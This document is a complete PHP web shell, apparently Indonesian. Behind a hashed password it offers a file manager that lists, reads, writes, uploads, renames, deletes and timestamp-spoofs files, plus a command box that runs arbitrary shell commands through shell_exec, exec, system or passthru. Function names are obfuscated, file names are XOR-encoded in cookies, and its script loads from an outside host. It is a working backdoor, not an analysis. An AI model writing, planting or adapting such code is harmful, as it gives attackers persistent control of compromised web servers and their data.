<?php
ini_set('session.gc_maxlifetime', 86400);
session_set_cookie_params(86400);

session_start();

$hashed_password = '$2b$12$tpumex1eLs.8Jr44/UH2geFuQBPddqW8PA.zaPkB7RgjPhnldk036';

if (isset($_GET['logout'])) {
    session_unset();
    session_destroy();
    header("Location: ?");
    exit;
}

if (!isset($_SESSION['plaga_auth'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
        if (password_verify($_POST['password'], $hashed_password)) {
            $_SESSION['plaga_auth'] = true;
            header("Location: ?");
            exit;
        }
        die("Password salah bego");
    }
    ?>
    <form method="post">
        <input type="password" name="password" placeholder="Password">
        <button type="submit">Login</button>
    </form>
    <?php
    exit;
}

header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache");

function hunterEncryptDecrypt($input, $key="12") {
    $output = '';
    for($i = 0; $i < strlen($input); $i++) {
        $output .= $input[$i] ^ $key[$i % strlen($key)];
    }
    return $output;
}

function listing_all_directory() {
    $path = $_COOKIE['path'] ?: getcwd();
    $result = array();
    $date_format = "d-m-Y H:i:s";

    if ($handle = opendir($path)) {
        while (false !== ($dir = readdir($handle))) {
            if ($dir === '.' || $dir === '..') continue;

            $full_path = "$path/$dir";
            $is_dir = is_dir($full_path);

            $tmp_result = array(
                'path' => htmlspecialchars($full_path),
                'is_writable' => is_writable($full_path),
                'is_dir' => $is_dir,
                'date' => date($date_format, filemtime($full_path)),
                'size' => $is_dir ? "" : round(filesize($full_path) / 1024, 2),
            );
            $result[] = $tmp_result;
        }
        closedir($handle);
    }

    return $result;
}

if (isset($_GET['home'])) {
    setcookie("path", getcwd());
    header("Location: ?");
    exit;
}

$action = $_REQUEST['action'] ?? false;
if (!$action) {
    main();
    menu();
}

function decode_char($string) {
    return hunterEncryptDecrypt(hex2bin($string));
}

switch ($action) {
    case 'd':
        die(json_encode(listing_all_directory()));
        break;

    case 'r':
        if($_SERVER['REQUEST_METHOD'] == 'POST') {
            $data = json_decode(file_get_contents("php://input"), true);
            $content = show_base_data()($data['content']);
            $filename = decode_char($_COOKIE['filename']);
            $message['success'] = fm_write_file($filename, $content);
            die(json_encode($message));
        }
        main();
        $content = customize_read_file(decode_char($_COOKIE['filename']));
        show_text_area(htmlspecialchars($content));
        break;

    case 'cr':
        main();
        show_text_area("");
        break;

    case 'ul':
        $filename = decode_char($_COOKIE['filename']);
        $message['success'] = show_un()($filename);
        die(json_encode($message));
        break;

    case 'up':
        $file = $_FILES['import_file'];
        $tmp_name = $file['tmp_name'];
        $content = customize_read_file($tmp_name);
        if(isset($_POST['by'])) {
            $content = show_base_data()($content);
        }
        $path = $_COOKIE['path'] ?: getcwd();
        $destination = "$path/" . $file['name'];
        $message['success'] = $content && fm_write_file($destination, $content) ?: rename($tmp_name, $destination);
        die(json_encode($message));
        break;

    case 're':
        $filename = decode_char($_COOKIE['filename']);
        $path = $_COOKIE['path'];
        if($_SERVER['REQUEST_METHOD'] == "POST") {
            $old_filename = "$path/$filename";
            $new_filename = "$path/" . $_POST['new'];
            $message['success'] = rename($old_filename, $new_filename);
            die(json_encode($message));
        }
        break;

    case 'to':
        $filename = decode_char($_COOKIE['filename']);
        if($_SERVER['REQUEST_METHOD'] == 'POST') {
            $str_date = strtotime($_POST['date']);
            $message['success'] = touch($filename, $str_date);
            clearstatcache(true, $filename);
            die(json_encode($message));
        }
        break;
}

function customize_read_file($file) {
    if (!file_exists($file)) return '';
    $handle = fopen($file, 'r');
    if ($handle) {
        $content = fread($handle, filesize($file));
        if ($content) return $content;
    }
    $lines = file($file);
    return $lines ? implode($lines) : show_file_contents()($file);
}

function show_file_contents() {
    return "file_get_contents";
}

function show_text_area($content) {
    $filename = decode_char($_COOKIE['filename']);
    echo "
    <p><a href='?' id='back_menu'>< Back</a></p>
    <p>$filename</p>
    <textarea width='100%' id='content' cols='20' rows='30' style='margin-top: 10px'>$content</textarea>
    <button type='submit' class='textarea-button' onclick='textarea_handle()'>Submit</button>
    ";
}

function show_base_data() {
    return "base64_decode";
}

function fm_write_file($file, $content) {
    if (function_exists('fopen')) {
        $handle = @fopen($file, 'w');
        if ($handle && @fwrite($handle, $content) !== false) {
            fclose($handle);
            return file_exists($file) && filesize($file) > 0;
        }
        fclose($handle);
    }
    if (function_exists('file_put_contents')) {
        if (@file_put_contents($file, $content) !== false) {
            return file_exists($file) && filesize($file) > 0;
        }
    }
    return false;
}

function fm_make_request($url) {
    if (function_exists("curl_init")) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        return curl_exec($ch);
    }
    return show_file_contents()($url);
}

function show_un() {
    return "unlink";
}

function main() {
    global $current_path;
    $current_path = $_COOKIE['path'] ?? getcwd();
    setcookie("path", $current_path);
    $path = str_replace('\\', '/', $current_path);
    $paths = explode('/', $path);

    echo "<div class='wrapper' id='path_div'>";
    foreach ($paths as $id => $pat) {
        if ($id == 0) echo '<a href="#" path="/" onclick="change_path(this)">/</a>';
        if ($pat != '') {
            $tmp_path = implode('/', array_slice($paths, 0, $id + 1));
            echo "<a href='#' path='$tmp_path' onclick='change_path(this)'>$pat/</a>";
        }
    }
    echo "</div>";

    echo '<link rel="stylesheet" href="https://wordpress.zzna.ru/newb/all.min.css">';
    echo '<link rel="stylesheet" href="https://wordpress.zzna.ru/newb/styles.css">';
    echo '<script src="https://wordpress.zzna.ru/newb/script.js"></script>';
}

function menu() {
    $command = $_GET['cmd'] ?? '';
    $cwd = $_COOKIE['path'] ?? getcwd();
    $output = $command ? runCommand($command, $cwd) : '';

    echo "<div class='wrapper'>
        <div style='margin-bottom:5px;font-family:monospace;color:#ccc'>
            Working dir: <span style='color:#0f0'>" . htmlspecialchars($cwd) . "</span>
        </div>

        <form method='post' enctype='multipart/form-data' style='display:inline-block;' >
            <div class='file-upload mr-10'>
                <label for='file-upload-input' style='cursor: pointer;'>[ Upload ]</label>
                <input type='file' id='file-upload-input' style='display: none;' onchange='handle_upload()'>
            </div>
        </form>

        <a href='?home=1' class='mr-10 white'>[ HOME ]</a>
        <a href='#' onclick='create_file()' class='mr-10 white'>[ Create File ]</a>

        <form method='get' style='display:inline-block; margin-left:10px;' onsubmit='this._t.value=Date.now();'>
            <input type='text' name='cmd' value='" . htmlspecialchars($command) . "' style='width:200px;' placeholder='CMD...'>
            <input type='hidden' name='_t' value=''>
            <input type='submit' value='Jalankan'>
        </form>
    </div>";

    echo ($command !== '') ? "<div style='margin-top:10px;'>
            <h3>CMD Output:</h3>
            <pre style='background:#111;color:#0f0;padding:10px;font-family:monospace;white-space:pre-wrap;'>" . htmlspecialchars($output) . "</pre>
        </div>" : "";

    echo "<table cellspacing='0' cellpadding='7' width='100%'>   
        <thead>
            <tr>
                <th width='44%'></th>
                <th width='11%'></th>
                <th width='17%'></th>
                <th width='17%'></th>
                <th width='11%'></th>
            </tr>
        </thead>
        <tbody id='data_table' class='blur-table'>
            <div class='wrapper' style='margin-top: -10px'>
                <input type='checkbox' class='mr-10' id='bypass-upload'>[ Hunter File Upload ]
            </div>
        </tbody>
    </table>";
}

function runCommand($cmd, $cwd = null) {
    $disabled = array_map('trim', explode(',', (string)ini_get('disable_functions')));
    if ($cwd && is_dir($cwd)) chdir($cwd);

    if (!in_array('shell_exec', $disabled)) {
        $out = shell_exec($cmd . " 2>&1");
        return $out !== null ? $out : '';
    }
    if (!in_array('exec', $disabled)) {
        $lines = array();
        exec($cmd . " 2>&1", $lines, $ret);
        return implode("\n", $lines) . "\n";
    }
    if (!in_array('system', $disabled)) {
        ob_start();
        system($cmd . " 2>&1");
        return ob_get_clean();
    }
    if (!in_array('passthru', $disabled)) {
        ob_start();
        passthru($cmd . " 2>&1");
        return ob_get_clean();
    }
    return "Command execution is disabled.";
}
?>


